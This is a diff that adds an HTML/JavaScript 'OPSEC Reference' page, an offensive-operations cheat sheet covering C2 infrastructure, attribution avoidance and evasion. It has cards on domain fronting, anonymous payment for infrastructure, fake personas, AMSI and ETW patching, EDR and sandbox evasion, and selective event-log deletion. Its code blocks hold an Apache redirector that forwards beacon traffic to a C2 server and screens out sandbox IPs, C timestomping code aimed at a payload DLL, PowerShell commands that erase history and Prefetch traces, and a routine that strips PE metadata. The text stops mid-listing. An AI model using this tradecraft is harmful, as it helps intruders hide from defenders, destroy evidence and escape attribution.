@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>OPSEC Reference</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#08090c;color:#e5e7eb;font-family:'Segoe UI',system-ui,sans-serif;min-height:100vh}
+.mono{font-family:'Cascadia Code','IBM Plex Mono','Fira Code',monospace}
+.off{color:#ef4444;font-weight:600;font-size:.82em}
+.hd{padding:10px 14px 0;border-bottom:1px solid #1a1d27;background:linear-gradient(180deg,#0c0e14,#08090c)}
+.hd h1{font-size:1em;font-weight:800;background:linear-gradient(135deg,#a78bfa,#818cf8,#60a5fa);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+.hd .sub{font-size:.62em;color:#374151}
+.st{display:flex;gap:1px;overflow-x:auto;flex-wrap:wrap}
+.sb{padding:4px 7px;border:none;cursor:pointer;border-radius:6px 6px 0 0;font-size:.66em;font-weight:600;white-space:nowrap;background:transparent;color:#374151;border-bottom:2px solid transparent;transition:all .15s}
+.sb.on{background:#111318}
+.sb[data-sc="kit"],.sb[data-sc="byp"]{border-left:2px solid #ffffff15;margin-left:4px}
+.ut{padding:0 14px;background:#0a0b10;border-bottom:1px solid #1a1d27;display:flex}
+.ub{padding:7px 12px;border:none;cursor:pointer;font-size:.7em;font-weight:600;background:transparent;color:#4b5563;border-bottom:2px solid transparent;display:flex;align-items:center;gap:4px}
+.ub.on{color:#e5e7eb;border-bottom-color:#e5e7eb}
+.cnt{font-size:.82em;background:#1f2937;padding:0 4px;border-radius:6px;color:#9ca3af}
+.ct{padding:10px 14px;overflow-x:auto}
+.fr{display:flex;align-items:flex-start;gap:0;overflow-x:auto;padding:8px 0}
+.ar{display:flex;align-items:center;padding:0 4px;flex-shrink:0}
+.ar .ln{width:24px;height:2px;background:linear-gradient(90deg,#4b5563,#9ca3af)}
+.ar .tp{color:#9ca3af;font-size:13px;margin-left:-2px}
+.ar .lb{font-size:.62em;color:#6b7280;margin-left:3px;white-space:nowrap}
+.bx{background:#0d0f14;border-radius:8px;flex-shrink:0;overflow:hidden}
+.bx-h{padding:6px 10px;font-weight:700;font-size:.8em}
+.bx-s{font-size:.65em;color:#4b5563;margin-top:1px}
+.bx-b{padding:6px 10px}
+.fd{display:flex;gap:6px;padding:1.5px 0;font-size:.78em;align-items:baseline}
+.fd.hl{background:#ffffff08;border-radius:3px;padding:2px 4px}
+.fd .tp{color:#6b7280;font-size:.82em}
+.tg{display:inline-block;padding:1px 7px;border-radius:4px;font-size:.78em;font-weight:700}
+.tg-s{padding:0 5px;font-size:.68em}
+.nt{margin:6px 0;padding:7px 10px;border-radius:6px}
+.nt .nl{font-size:.6em;font-weight:800;letter-spacing:.08em;margin-bottom:2px}
+.nt .nb{color:#d1d5db;font-size:.78em;line-height:1.4}
+.cp{border:1px solid #1f2937;border-radius:8px;overflow:hidden;margin-bottom:6px}
+.ct2{width:100%;padding:8px 12px;border:none;cursor:pointer;text-align:left;background:#0d0f14;display:flex;align-items:center;gap:8px}
+.ct2:hover{background:#111827}
+.cv{color:#6b7280;font-size:12px;transition:transform .15s;display:inline-block}
+.cv.op{transform:rotate(90deg)}
+.ct2 .tl{color:#e5e7eb;font-size:.8em;font-weight:600;flex:1}
+.cb{margin:0;padding:10px 14px;background:#080a0f;font-size:.74em;line-height:1.5;color:#a5f3fc;overflow-x:auto;border-top:1px solid #1f2937;white-space:pre;tab-size:4}
+.cb .cm{color:#4b5563}
+.cb .pp{color:#f59e0b}
+.ti{border-radius:6px;overflow:hidden;border:1px solid #1f2937;background:#0a0c10;margin-bottom:3px}
+.ti.op{border-color:#f9731640;background:#f9731608}
+.tt{width:100%;padding:6px 10px;border:none;cursor:pointer;text-align:left;background:transparent;display:flex;align-items:center;gap:6px}
+.tt .tn{font-size:.78em;font-weight:600;color:#9ca3af}
+.ti.op .tn{color:#fdba74}
+.td{padding:4px 10px 8px 26px;color:#d1d5db;font-size:.76em;line-height:1.5}
+.nb2{padding:2px 6px;border:1px solid #1f2937;border-radius:4px;cursor:pointer;background:#0d0f14;color:#4b5563;font-size:.65em}
+.ft{padding:8px 14px;border-top:1px solid #1a1d27;display:flex;gap:8px;flex-wrap:wrap;font-size:.6em}
+.dt{width:6px;height:6px;border-radius:2px;display:inline-block}
+.grd{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:8px}
+</style>
+</head>
+<body>
+<div id="app"></div>
+<script>
+var $=function(s){return document.querySelector(s)};
+var $$=function(s){return Array.prototype.slice.call(document.querySelectorAll(s))};
+function esc(s){return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')}
+var SE=[
+{id:"net",l:"A. Network",i:"\u{1F310}",c:"#60a5fa"},
+{id:"hst",l:"B. Host",i:"\u{1F4BB}",c:"#f87171"},
+{id:"idn",l:"C. Identity",i:"\u{1F3AD}",c:"#a78bfa"},
+{id:"tol",l:"D. Tooling",i:"\u{1F527}",c:"#fbbf24"},
+{id:"com",l:"E. Comms/C2",i:"\u{1F4E1}",c:"#34d399"},
+{id:"exe",l:"F. Execution",i:"\u26A1",c:"#f59e0b"},
+{id:"adv",l:"G. Advanced",i:"\u{1F9E0}",c:"#e879f9"},
+{id:"kit",l:"H. Toolkit",i:"\u{1F9F0}",c:"#f472b6"},
+{id:"byp",l:"I. Bypasses",i:"\u{1F6E1}\uFE0F",c:"#fb923c"}
+];
+var S={s:'net',t:'flow'};
+function T(t,c,s){return '<span class="tg'+(s?' tg-s':'')+'\" style=\"background:'+c+'18;color:'+c+';border:1px solid '+c+'30\">'+t+'</span>'}
+function A(l){return '<div class="ar"><div class="ln"></div><div class="tp">&#9658;</div>'+(l?'<div class="lb">'+l+'</div>':'')+'</div>'}
+function B(t,c,b,w,s){return '<div class="bx" style="min-width:'+(w||220)+'px;max-width:'+(w?w+100:330)+'px;border:1px solid '+c+'35"><div class="bx-h" style="color:'+c+';border-bottom:1px solid '+c+'20;background:linear-gradient(135deg,'+c+'12,'+c+'05)">'+t+(s?'<div class="bx-s">'+s+'</div>':'')+'</div><div class="bx-b">'+b+'</div></div>'}
+function F(o,n,t,hl){return '<div class="fd'+(hl?' hl':'')+'\">'+(o?'<code class="mono off">'+o+'</code> ':'')+' <span style="flex:1">'+n+'</span>'+(t?'<span class="tp mono">'+t+'</span>':'')+'</div>'}
+function N(l,c,b){return '<div class="nt" style="background:'+c+'08;border:1px solid '+c+'25"><div class="nl" style="color:'+c+'">'+l+'</div><div class="nb">'+b+'</div></div>'}
+function CRD(icon,title,color,body){return '<div style="border-radius:8px;border:1px solid '+color+'25;background:'+color+'06;overflow:hidden"><div style="padding:8px 10px;color:'+color+';border-bottom:1px solid '+color+'15;font-weight:700;font-size:.76em">'+icon+' '+title+'</div><div style="padding:8px 10px;font-size:.72em;color:#d1d5db;line-height:1.5">'+body+'</div></div>'}
+function fNET(){
+var h='<div style="font-size:.72em;font-weight:800;color:#60a5fa;letter-spacing:.06em;margin-bottom:6px">NETWORK OPSEC</div>';
+h+='<div class="grd">';
+h+=CRD("\u{1F310}","Domain Fronting","#60a5fa",
+F("","High-reputation CDN domain as front","")+F("","Host header routes to actual C2","")+F("","TLS SNI shows CDN domain only","")+F("","Blocked by many CDNs now (Azure, AWS CloudFront)","")+
+'<div style="font-size:.88em;color:#f59e0b;margin-top:4px">\u26A0 Declining viability. Check CDN policy first.</div>');
+h+=CRD("\u{1F500}","Redirectors","#60a5fa",
+F("","Place between target and C2 server","")+F("","Apache mod_rewrite / Nginx proxy_pass","")+F("","Filter by User-Agent, IP, headers","")+F("","Drop non-beacon traffic (sandbox/researcher)","")+F("","Multiple layers: target \u2192 redir1 \u2192 redir2 \u2192 C2","")+
+'<div style="font-size:.88em;color:#34d399;margin-top:4px">\u2713 Essential. Never expose C2 directly.</div>');
+h+=CRD("\u{1F4E1}","CDN as C2 Channel","#60a5fa",
+F("","CloudFront, Azure CDN, Fastly","")+F("","C2 traffic looks like normal CDN browsing","")+F("","SSL cert is CDN\u2019s (trusted)","")+F("","IP resolves to CDN edge, not your infra","")+
+'<div style="font-size:.88em;color:#34d399;margin-top:4px">\u2713 IP-based blocking impossible. High-trust certs.</div>');
+h+=CRD("\u{1F512}","DNS OPSEC","#60a5fa",
+F("","Categorized domains (health, business, news)","")+F("","Aged domains (>6 months, real history)","")+F("","DNS over HTTPS/TLS for resolution","")+F("","Avoid recently registered domains","")+F("","Match DNS TTL to legitimate sites","")+
+'<div style="font-size:.88em;color:#34d399;margin-top:4px">\u2713 Domain reputation is critical. Budget for aged domains.</div>');
+h+=CRD("\u{1F4CA}","Traffic Blending","#60a5fa",
+F("","Match normal business-hours traffic patterns","")+F("","HTTPS on 443 with valid certificates","")+F("","HTTP/2 or HTTP/3 (modern protocols)","")+F("","User-Agent matches target environment browser","")+F("","TLS JA3/JA3S fingerprint management","")+
+'<div style="font-size:.88em;color:#34d399;margin-top:4px">\u2713 Traffic should be indistinguishable from normal browsing.</div>');
+h+=CRD("\u{1F6E1}\uFE0F","VPN / Proxy Layering","#60a5fa",
+F("","Commercial VPN (no-log, crypto payment)","")+F("","VPS chain: hop1 \u2192 hop2 \u2192 C2","")+F("","Tor for registration, not operations","")+F("","Different exit points per operation","")+F("","Never mix operational and personal IPs","")+
+'<div style="font-size:.88em;color:#f87171;margin-top:4px">\u26A0 Single VPN = single point of trust. Layer multiple.</div>');
+h+='</div>';return h;
+}
+
+function fHST(){
+var h='<div style="font-size:.72em;font-weight:800;color:#f87171;letter-spacing:.06em;margin-bottom:6px">HOST-LEVEL OPSEC</div>';
+h+='<div class="grd">';
+h+=CRD("\u{1F9F9}","Artifact Cleanup","#f87171",
+F("","Delete dropped files after execution","")+F("","Clear Prefetch (C:\\\\Windows\\\\Prefetch\\\\*.pf)","")+F("","Clear Recent files, Jump Lists","")+F("","Clear PowerShell history (ConsoleHost_history.txt)","")+F("","Clear ShimCache (AppCompatCache)","")+F("","Wipe USN journal entries (fsutil usn)",""));
+h+=CRD("\u{1F4C5}","Timestomping","#f87171",
+F("","Match file timestamps to OS install date","")+F("","SetFileTime modifies $STANDARD_INFORMATION","")+F("","$FILE_NAME in MFT only kernel-modifiable","")+F("","Copy timestamps from kernel32.dll or ntdll.dll","")+F("","Compilation timestamps in PE headers too!",""));
+h+=CRD("\u{1F4CB}","Log Awareness","#f87171",
+F("","Security.evtx: 4624, 4672, 4688, 4776","")+F("","Sysmon: process, network, registry, file","")+F("","PowerShell: ScriptBlock, Module, Transcription","")+F("","WMI Activity log, Task Scheduler log","")+F("","Application crash dumps expose payloads",""));
+h+=CRD("\u{1F5D1}\uFE0F","Selective Log Clearing","#f87171",
+F("","Full clear is obvious (Event 1102)","")+F("","Thread suspension on EventLog svchost","")+F("","Phantom event log patching (mimikatz)","")+F("","Delete specific records from .evtx","")+F("","EvtMuteHook: filter events in real-time",""));
+h+=CRD("\u{1F9EA}","Memory Forensics Awareness","#f87171",
+F("","Encrypted payloads during sleep","")+F("","Wipe PE headers after mapping","")+F("","Avoid strings in cleartext","")+F("","Stack spoofing hides call origins","")+F("","Image-backed memory > private alloc",""));
+h+='</div>';return h;
+}
+
+function fIDN(){
+var h='<div style="font-size:.72em;font-weight:800;color:#a78bfa;letter-spacing:.06em;margin-bottom:6px">IDENTITY & ATTRIBUTION OPSEC</div>';
+h+='<div class="grd">';
+h+=CRD("\u{1F3AD}","Persona Separation","#a78bfa",
+F("","Unique persona per engagement/operation","")+F("","No cross-contamination between personas","")+F("","Separate browsers, VMs, email accounts","")+F("","Different writing style per persona","")+F("","No reuse of handles, emails, keys",""));
+h+=CRD("\u{1F4B3}","Financial OPSEC","#a78bfa",
+F("","Crypto for infra payments (Monero preferred)","")+F("","Privacy-focused registrars (Njalla, etc.)","")+F("","Prepaid cards for VPS (where accepted)","")+F("","No personal credit/debit cards ever","")+F("","Different payment methods per provider",""));
+h+=CRD("\u{1F4DD}","Registration OPSEC","#a78bfa",
+F("","Temp email (guerrillamail, proton aliases)","")+F("","VPN/Tor for all registrations","")+F("","Fake but consistent persona details","")+F("","No phone number reuse across services","")+F("","VOIP numbers (TextNow, MySudo) if needed",""));
+h+=CRD("\u{1F4BB}","Development OPSEC","#a78bfa",
+F("","Compile in clean VM (no personal paths)","")+F("","Strip PDB paths, Rich headers","")+F("","Remove metadata from all files","")+F("","Different coding style per project","")+F("","No reuse of unique strings/constants",""));
+h+=CRD("\u23F0","Timezone OPSEC","#a78bfa",
+F("","Compile timestamps reveal timezone","")+F("","PE timestamp: set to UTC or target zone","")+F("","Git commits: author.date manipulation","")+F("","Activity patterns reveal working hours","")+F("","Operate in target timezone when possible",""));
+h+=CRD("\u{1F30D}","Language OPSEC","#a78bfa",
+F("","System locale in compiled binaries","")+F("","Code comments, variable names, strings","")+F("","Error messages and debug output","")+F("","Keyboard layout artifacts","")+F("","Resource section language IDs in PE",""));
+h+='</div>';return h;
+}
+
+function fTOL(){
+var h='<div style="font-size:.72em;font-weight:800;color:#fbbf24;letter-spacing:.06em;margin-bottom:6px">TOOLING OPSEC</div>';
+h+='<div class="grd">';
+h+=CRD("\u{1F4A3}","Signature Management","#fbbf24",
+F("","Unique builds per engagement","")+F("","Change function names, strings, constants","")+F("","Different encryption keys per target","")+F("","Vary PE section names (.text \u2192 .code)","")+F("","Modify Rich header or remove entirely",""));
+h+=CRD("\u{1F4CA}","Entropy Management","#fbbf24",
+F("","Raw shellcode: ~7.5 bits/byte (flagged)","")+F("","XOR with repeating key: ~6.0","")+F("","Target: 4.5-5.5 bits/byte (normal range)","")+F("","Pad with English text or null-interleave","")+F("","Use encoding that reduces entropy (UUID, IPv4)",""));
+h+=CRD("\u{1F50D}","IOC Avoidance","#fbbf24",
+F("","No hardcoded IPs/domains in binary","")+F("","Encrypt all configs, decrypt at runtime","")+F("","Rotate mutex names, pipe names, file names","")+F("","Unique user-agents per deployment","")+F("","Random sleep/jitter values per build",""));
+h+=CRD("\u{1F4DC}","YARA Evasion","#fbbf24",
+F("","Break known-bad byte patterns","")+F("","Avoid common tool signatures (Mimikatz strings)","")+F("","Runtime string construction vs static strings","")+F("","Metamorphic code (vary instruction sequences)","")+F("","Test against public YARA rules before deploy",""));
+h+=CRD("\u{1F9EA}","Anti-Sandbox","#fbbf24",
+F("","Check CPU core count (>= 2)","")+F("","Check RAM (>= 4GB)","")+F("","Check disk size (>= 60GB)","")+F("","Mouse movement / human interaction","")+F("","Domain-joined check (targeted ops only)","")+F("","Sleep acceleration detection (RDTSC delta)",""));
+h+=CRD("\u{1F4E6}","Payload Delivery","#fbbf24",
+F("","Staged: small loader \u2192 pull full payload","")+F("","Encrypted payload, key from environment","")+F("","Keyed payload: only decrypts on target host","")+F("","ISO/VHD containers bypass MOTW","")+F("","LNK \u2192 LOLBin \u2192 download \u2192 execute",""));
+h+='</div>';return h;
+}
+
+function fCOM(){
+var h='<div style="font-size:.72em;font-weight:800;color:#34d399;letter-spacing:.06em;margin-bottom:6px">COMMS & C2 OPSEC</div>';
+h+='<div class="fr">';
+h+=B("C2 Profile","#34d399",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","Malleable C2 profiles (Cobalt Strike)","")+F("","Custom HTTP headers to match legit traffic","")+F("","URI paths: /api/v1/status, /wp-content/","")+F("","Content-Type: application/json or text/html","")+F("","Metadata in cookies, headers, body params","")+'</div>',240);
+h+=A("blend");
+h+=B("Timing","#34d399",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","Sleep: 60-300s for long-haul (not 0!)","")+F("","Jitter: 30-50% randomization","")+F("","Business hours only (working_hours)","")+F("","Accelerate only during active tasking","")+F("","Kill date for auto-cleanup","")+'</div>',220);
+h+=A("survive");
+h+=B("Resilience","#34d399",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","Multiple C2 channels (HTTP + DNS fallback)","")+F("","Domain rotation / dead drop resolvers","")+F("","Peer-to-peer mesh (SMB pipes, TCP)","")+F("","Self-destruct on analysis detection","")+F("","Encrypted config with rotation schedule","")+'</div>',240);
+h+='</div>';
+h+=N("GOLDEN RULE","#34d399","C2 with 0 sleep and no jitter is the #1 way operators get caught. <b>Minimum 60s sleep with 30%+ jitter</b> for any long-haul operation. Accelerate only for active tasking windows, then return to slow beacon.");
+return h;
+}
+function fEXE(){
+var h='<div style="font-size:.72em;font-weight:800;color:#f59e0b;letter-spacing:.06em;margin-bottom:6px">EXECUTION OPSEC</div>';
+h+='<div class="grd">';
+h+=CRD("\u26A1","In-Memory Execution","#f59e0b",
+F("","Manual map: no LoadLibrary, no PEB entry","")+F("","Reflective loading: self-contained loader","")+F("","Assembly.Load(byte[]) for .NET","")+F("","Donut: any .NET/PE \u2192 position-independent shellcode","")+F("","Never touch disk with payload",""));
+h+=CRD("\u{1F4CB}","LOLBin Execution","#f59e0b",
+F("","msbuild.exe: inline task C# execution","")+F("","mshta.exe: HTA with VBScript/JScript","")+F("","rundll32.exe: load DLL export","")+F("","regsvr32.exe: COM scriptlet (.sct)","")+F("","certutil.exe: download + decode","")+F("","wmic.exe: XSL script execution",""));
+h+=CRD("\u{1F6E1}\uFE0F","AMSI Bypass","#f59e0b",
+F("","Patch AmsiScanBuffer (E_INVALIDARG return)","")+F("","Patch AmsiOpenSession","")+F("","amsiInitFailed reflection (.NET)","")+F("","Must bypass BEFORE script execution","")+F("","Re-patch if AMSI is restored",""));
+h+=CRD("\u{1F50D}","ETW Bypass","#f59e0b",
+F("","Patch ntdll!EtwEventWrite (ret 0)","")+F("","Kills usermode ETW telemetry","")+F("","Kernel ETW unaffected from usermode","")+F("","Patch BEFORE injection/payload","")+F("","Optionally restore after operation",""));
+h+=CRD("\u{1F4E6}","CLR Hosting","#f59e0b",
+F("","ICLRRuntimeHost for .NET from native","")+F("","AppDomainManager for config-based injection","")+F("","BYOL (Bring Your Own .NET) execution","")+F("","ETW CLR provider separate from ntdll ETW","")+F("","Patch both for full coverage",""));
+h+=CRD("\u{1F9F5}","Thread Execution Alternatives","#f59e0b",
+F("","APC queues (no CreateThread)","")+F("","Thread pool work items","")+F("","Callback functions (EnumWindows, timers)","")+F("","Fiber conversion + scheduling","")+F("","Instrumentation callbacks",""));
+h+='</div>';return h;
+}
+
+function fADV(){
+var h='<div style="font-size:.72em;font-weight:800;color:#e879f9;letter-spacing:.06em;margin-bottom:6px">ADVANCED OPSEC TECHNIQUES</div>';
+h+='<div class="grd">';
+h+=CRD("\u23F0","Time-Based Operations","#e879f9",
+F("","Operate during target business hours","")+F("","Match target timezone for all timestamps","")+F("","Schedule payloads for high-activity periods","")+F("","Avoid weekends/holidays (anomalous activity)","")+F("","Kill dates: auto-cleanup after window",""));
+h+=CRD("\u{1F30D}","Geofencing","#e879f9",
+F("","Check target IP geolocation before executing","")+F("","Only decrypt payload in target country/region","")+F("","Block execution from known sandbox IP ranges","")+F("","Use GeoIP DB or DNS-based checks","")+F("","Fail silently outside target geography",""));
+h+=CRD("\u{1F50E}","Anti-Forensics","#e879f9",
+F("","Secure delete: overwrite before delete","")+F("","In-memory only: never write to disk","")+F("","Encrypted sleep: payload encrypted at rest","")+F("","Timestamp manipulation across all artifacts","")+F("","Break forensic timeline coherence",""));
+h+=CRD("\u{1F9EC}","Environment Keying","#e879f9",
+F("","Derive decryption key from hostname","")+F("","Key from domain name, username, SID","")+F("","Key from installed software (target-specific)","")+F("","Payload inert on any other system","")+F("","Prevents sandbox detonation + IR analysis",""));
+h+=CRD("\u{1F4A4}","Sleep Obfuscation","#e879f9",
+F("","Encrypt payload during sleep","")+F("","Spoof call stack while dormant","")+F("","Change memory to RW (non-executable)","")+F("","Timer-based decrypt \u2192 execute \u2192 re-encrypt","")+F("","Ekko, Foliage, Cronos implementations",""));
+h+=CRD("\u{1F9F2}","EDR Unhooking Decisions","#e879f9",
+F("","Full unhook: remap ntdll from KnownDlls","")+F("","Selective: patch specific functions","")+F("","Syscalls: bypass hooks entirely","")+F("","Full unhook is detectable (private memory)","")+F("","Syscalls + indirect = best balance",""));
+h+='</div>';return h;
+}
+
+function fKIT(){
+var h='<div style="font-size:.72em;font-weight:800;color:#f472b6;letter-spacing:.06em;margin-bottom:6px">OPSEC CHECKLIST</div>';
+h+='<div class="grd" style="margin-bottom:10px">';
+var checks=[
+{n:"Pre-Operation",items:["Clean VM for build (no personal artifacts)","Strip PDB paths, Rich header, metadata","Unique encryption keys per engagement","Test payload against target EDR (if known)","Verify domain categorization + reputation","Configure redirectors + test filtering","Set kill dates + self-destruct"],c:"#60a5fa"},
+{n:"During Operation",items:["Sleep >= 60s, jitter >= 30%","Business hours only for active tasking","Rotate C2 domains on schedule","Monitor for signs of detection","Minimize lateral movement footprint","Clean artifacts after each action","Use in-memory execution exclusively"],c:"#34d399"},
+{n:"Post-Operation",items:["Remove all persistence mechanisms","Delete dropped files + staged payloads","Clear relevant event logs (selectively)","Destroy infrastructure (VPS, domains)","Wipe build VMs","No reuse of indicators across engagements","Document for deconfliction if needed"],c:"#f87171"},
+];
+checks.forEach(function(ch){
+h+='<div style="border-radius:8px;border:1px solid '+ch.c+'25;background:'+ch.c+'06;overflow:hidden"><div style="padding:8px 10px;color:'+ch.c+';border-bottom:1px solid '+ch.c+'15;font-weight:700;font-size:.76em">\u2705 '+ch.n+'</div><div style="padding:6px 10px">';
+ch.items.forEach(function(item){h+='<div style="font-size:.7em;color:#d1d5db;padding:1.5px 0;display:flex;gap:4px"><span style="color:'+ch.c+'">&#9679;</span>'+item+'</div>';});
+h+='</div></div>';
+});
+h+='</div>';
+h+=N("COMMON MISTAKES","#f472b6","<b>Top operator errors:</b> Sleep=0 on beacon, reusing infrastructure across ops, testing payloads on VirusTotal (public!), personal IP leaking through VPN failure, timestamps in wrong timezone, hardcoded strings matching known tools.");
+return h;
+}
+
+function fBYP(){
+var h='<div class="grd">';
+h+=CRD("\u{1F6E1}\uFE0F","EDR-Specific Evasion","#fb923c",
+F("","CrowdStrike: heavy on kernel callbacks + ETW","")+F("","SentinelOne: usermode hooks + behavioral AI","")+F("","Defender: AMSI + cloud lookups + SmartScreen","")+F("","Carbon Black: process tree analysis","")+F("","Each EDR has different weak points","")+
+'<div style="font-size:.88em;color:#f59e0b;margin-top:4px">Test against specific target EDR. Generic bypass rarely works on all.</div>');
+h+=CRD("\u{1F4CA}","Logging Evasion","#fb923c",
+F("","Sysmon: avoid triggering registered events","")+F("","PowerShell: use .NET interop instead of cmdlets","")+F("","WMI: events 19-21 for subscriptions","")+F("","Event 4688: process command line logging","")+F("","Firewall logs: use allowed ports/protocols",""));
+h+=CRD("\u{1F50D}","Sandbox Evasion","#fb923c",
+F("","Time acceleration: RDTSC delta check","")+F("","Resource checks: CPU, RAM, disk, monitors","")+F("","User interaction: mouse movement, clicks","")+F("","Domain check: is machine domain-joined?","")+F("","MAC address prefix: common VM vendors","")+F("","Process list: analysis tools running?",""));
+h+=CRD("\u{1F4E6}","AV Evasion Patterns","#fb923c",
+F("","Staged loading: small clean loader + encrypted payload","")+F("","Syscalls: skip usermode hooks entirely","")+F("","Unhooking: restore ntdll from clean copy","")+F("","In-memory only: no file on disk to scan","")+F("","Sleep + encrypt: avoid memory scanning",""));
+h+=CRD("\u{1F512}","Network Monitoring Evasion","#fb923c",
+F("","JA3 fingerprint: match legitimate browsers","")+F("","Domain categorization: health, business","")+F("","Certificate: EV or OV from trusted CA","")+F("","Packet size: match normal HTTP patterns","")+F("","DNS: minimal queries, realistic TTLs",""));
+h+=CRD("\u{1F9F0}","Forensic Evasion","#fb923c",
+F("","Prefetch: delete or don\'t trigger creation","")+F("","ShimCache: cleared on reboot only","")+F("","Amcache: executable tracking in hive","")+F("","MFT $FILE_NAME: survives timestomping","")+F("","USN Journal: file operation history",""));
+h+='</div>';return h;
+}
+function getCodes(s){
+var C={};
+C.net=[
+{t:"Apache redirector rules (mod_rewrite)",l:"c",c:"# .htaccess on redirector\nRewriteEngine On\n\n# Block known sandboxes/scanners by IP\nRewriteCond %{REMOTE_ADDR} ^(54\\.240\\.|52\\.94\\.) [OR]\nRewriteCond %{REMOTE_ADDR} ^(34\\.199\\.)|^(3\\.80\\.)\nRewriteRule ^.*$ http://legitimate-site.com [L,R=302]\n\n# Block non-matching User-Agents\nRewriteCond %{HTTP_USER_AGENT} !(Mozilla.*Windows) [NC]\nRewriteRule ^.*$ http://legitimate-site.com [L,R=302]\n\n# Only allow expected URI paths\nRewriteCond %{REQUEST_URI} !^/api/v1/(status|update|config)\nRewriteRule ^.*$ http://legitimate-site.com [L,R=302]\n\n# Forward matching traffic to C2\nRewriteRule ^/api/v1/(.*)$ https://REAL-C2-SERVER/$1 [P,L]\n\n# Log dropped requests for analysis\n# CustomLog /var/log/dropped.log combined"},
+{t:"JA3 fingerprint matching (Golang proxy)",l:"c",c:"// Proxy that presents a specific JA3 fingerprint\n// matching Chrome on Windows 10\n//\n// Tools:\n// - CycleTLS (Go library)\n// - uTLS (Go TLS library with JA3 control)\n//\n// Chrome 120 JA3: 771,4865-4866-4867-...\n// JA3S varies by server\n//\n// Implementation concept:\n// import \"github.com/refraction-networking/utls\"\n// config := &utls.Config{ServerName: target}\n// conn := utls.UClient(rawConn, config,\n//     utls.HelloChrome_120)\n// conn.Handshake()\n//\n// This makes TLS fingerprint match real Chrome\n// Network monitoring sees Chrome-like connection\n// Even deep packet inspection can't distinguish"},
+{t:"Domain categorization check",l:"c",c:"// Check domain categorization before use:\n// - Symantec/Bluecoat: sitereview.bluecoat.com\n// - McAfee: trustedsource.org\n// - Palo Alto: urlfiltering.paloaltonetworks.com\n// - Fortinet: fortiguard.com/webfilter\n// - Checkpoint: urlcat.checkpoint.com\n//\n// Ideal categories:\n// - Business, Technology, Health, Education\n// - Avoid: Uncategorized, Newly Registered\n//\n// Domain aging strategy:\n// 1. Register domain 6-12 months before op\n// 2. Host legitimate-looking content\n// 3. Get crawled by categorization engines\n// 4. Submit for categorization if needed\n// 5. Verify category before operational use\n//\n// Expired domain purchase:\n// - expireddomains.net\n// - Check Wayback Machine for history\n// - Verify no spam/malware blacklisting\n// - Check domain category already assigned"}
+];
+C.hst=[
+{t:"Timestomping (match OS files)",l:"c",c:"void Timestomp(LPCSTR target, LPCSTR reference) {\n    HANDLE hRef = CreateFileA(reference, GENERIC_READ,\n        FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);\n    FILETIME ct, at, wt;\n    GetFileTime(hRef, &ct, &at, &wt);\n    CloseHandle(hRef);\n\n    HANDLE hTgt = CreateFileA(target, FILE_WRITE_ATTRIBUTES,\n        FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);\n    SetFileTime(hTgt, &ct, &at, &wt);\n    CloseHandle(hTgt);\n}\n\n// Usage: match kernel32.dll\nTimestomp(\"C:\\\\Temp\\\\payload.dll\",\n    \"C:\\\\Windows\\\\System32\\\\kernel32.dll\");\n\n// Also fix PE compilation timestamp:\n// Offset: PE_HEADER + 0x08 (TimeDateStamp)\n// Set to match legitimate DLLs"},
+{t:"Selective event log deletion",l:"c",c:"// Delete specific events without clearing entire log\n// Full clear generates Event 1102 (audit log cleared)\n\n// Method 1: Thread suspension (blind EventLog)\n// Find svchost.exe hosting EventLog service\n// Suspend all threads -> events stop being written\n// Perform operations\n// Resume threads -> gap in log but no clear event\n\n// Method 2: EvtMuteHook\n// Hook EventWriteTransfer in target process\n// Filter specific event IDs from being logged\n// Only your events are suppressed\n\n// Method 3: Direct .evtx manipulation\n// Stop EventLog service (or copy file)\n// Parse EVTX binary format\n// Remove specific records, fix checksums\n// Restart service with clean file\n\n// Method 4: wevtutil (noisy but simple)\n// wevtutil cl Security  // DONT DO THIS\n// wevtutil qe Security /q:\"*[System[EventID=4624]]\""},
+{t:"PowerShell history cleanup",l:"c",c:"// ConsoleHost_history.txt stores ALL PS commands\n$histPath = (Get-PSReadlineOption).HistorySavePath\n// Default: %APPDATA%\\Microsoft\\Windows\\PowerShell\\\n//   PSReadLine\\ConsoleHost_history.txt\n\n// Delete after operations:\nRemove-Item $histPath -Force\n\n// Or disable for current session:\nSet-PSReadlineOption -HistorySaveStyle SaveNothing\n\n// Clear in-memory history too:\nClear-History\n[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()\n\n// Prefetch cleanup (admin required):\nRemove-Item C:\\Windows\\Prefetch\\POWERSHELL*.pf -Force\n\n// Recent files cleanup:\nRemove-Item \"$env:APPDATA\\Microsoft\\Windows\\Recent\\*\" -Force\n\n// Jump lists:\nRemove-Item \"$env:APPDATA\\Microsoft\\Windows\\Recent\\\n  AutomaticDestinations\\*\" -Force"}
+];
+C.idn=[
+{t:"Strip PE metadata and paths",l:"c",c:"// PDB path reveals username and project structure:\n// C:\\Users\\realname\\source\\repos\\malware\\debug\\mal.pdb\n\n// Compile-time fixes:\n// /PDBALTPATH:%_PDB% (generic PDB path)\n// /DEBUG:NONE (no PDB at all for release)\n\n// Rich header removal (post-build):\n// Rich header at offset after DOS stub\n// Contains toolchain version info\n// Zero from e_lfanew-backward to first non-zero\nvoid StripRichHeader(PBYTE pe) {\n    DWORD peOff = ((PIMAGE_DOS_HEADER)pe)->e_lfanew;\n    // Search backward from PE sig for 'Rich'\n    for (DWORD i = peOff - 4; i > 0x40; i -= 4) {\n        if (*(DWORD*)(pe + i) == 0x68636952) { // 'Rich'\n            // Zero from DanS signature to Rich\n            DWORD start = 0x80; // typical DanS location\n            memset(pe + start, 0, i + 8 - start);\n            break;\n        }\n    }\n}\n\n// Compilation timestamp: set to target era\n// PE + 0x08: TimeDateStamp (epoch seconds)\n// Resource section: VS_FIXEDFILEINFO timestamps"},
